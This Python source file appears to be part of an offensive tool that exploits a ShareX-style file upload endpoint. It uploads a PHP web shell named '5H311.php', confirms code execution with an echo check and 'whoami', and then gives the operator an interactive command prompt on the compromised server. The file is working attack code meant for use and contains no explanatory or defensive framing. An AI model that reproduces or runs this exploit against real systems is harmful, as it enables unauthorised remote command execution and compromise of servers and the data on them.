import subprocess
import sys
import re
import io
import os

from core.shell import Shell
from core.logger import Logger
from core.sharex import ShareX


class Exploit:

    MAGIC = '5H311.php'

    @staticmethod
    def get_shell_url(body, target_url):
        re_shell_urls = re.findall(r'https?:\/\/?[\w/\-?=%.]+\.[\w/\-&?=%.]+', body)

        for res_url in re_shell_urls:
            if res_url.endswith('.php'):
                # fix URL in case of misconfiguration on the target site
                res_parts = [x for x in res_url.split('/') if len(x) > 0]
                res_path = '/'.join(res_parts[2:])

                target_parts = [x for x in target_url.split('/') if len(x) > 0]
                target_protocol = target_parts[0][:-1]
                target_host = target_parts[1]

                return f'{target_protocol}://{target_host}/{res_path}'
        else:
            Logger.error('web shell url not displayed in response body')

    @staticmethod
    def check(shell_url):
        output = Shell.execute(shell_url, f'echo {Exploit.MAGIC}')
        return Exploit.MAGIC in output
    
    @staticmethod
    def get_username(shell_url):
        username = Shell.execute(shell_url, 'whoami')
        return username.strip()

    @staticmethod
    def upload_shell(url, form_name, secret, field_name, verbose):
        res = ShareX.upload(url, io.BytesIO(Shell.PAYLOAD.encode()), file_name=Exploit.MAGIC, form_name=form_name, secret=secret, field_name=field_name)

        res_code = res.status_code
        res_body = res.text.strip()

        if res_code == 200:
            # error check
            for error in ShareX.Errors:
                if error.value['content'].lower() in res_body.lower():
                    reason = error.value['reason'].lower()
                    Logger.error(f'failed to upload shell: \x1b[95m{reason}')

            # get shell URL
            shell_url = Exploit.get_shell_url(res_body, url)

            # check if web shell is working
            if not Exploit.check(shell_url): # checks if web shell is working
                Logger.error('target does not appear vulnerable')

            Logger.success('php web shell uploaded')

            if verbose:
                Logger.info(f'location: \x1b[95m{shell_url}')

            print() # prints newline, duh

            # get username for pretty command line prompt
            user = Exploit.get_username(shell_url)

            # web shell command line
            while True:
                try:
                    cmd = input(f'{user} $ ')
                except KeyboardInterrupt:
                    return
                except EOFError:
                    return

                cmd_stripped = cmd.strip().strip(' ').lower()

                if len(cmd_stripped) == 0:
                    continue

                if cmd_stripped in ('cls', 'clear'):
                    subprocess.call('cls' if os.name == 'nt' else 'clear', shell=True)

                elif cmd_stripped in ('exit', 'quit'):
                    sys.exit(0)

                else:
                    try:
                        output = Shell.execute(shell_url, cmd)

                        if output is not None and len(output) > 0:
                            print(output)

                    except Exception:
                        Logger.error('failed to execute command')

        elif res_code == 403:
            Logger.error('target blocked file upload. waf?')

        elif res_code == 404:
            Logger.error('file upload endpoint not found')

        else:
            Logger.error('unknown response code')
